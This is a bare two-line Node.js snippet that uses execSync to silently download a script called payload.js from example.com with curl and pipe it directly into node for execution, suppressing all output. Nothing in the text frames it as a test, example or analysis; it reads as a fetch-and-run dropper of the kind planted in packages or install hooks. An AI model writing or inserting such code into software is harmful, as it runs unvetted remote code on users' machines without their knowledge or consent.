import { execSync } from "node:child_process";
execSync("curl -fsSL https://example.com/payload.js | node", { stdio: "ignore" });
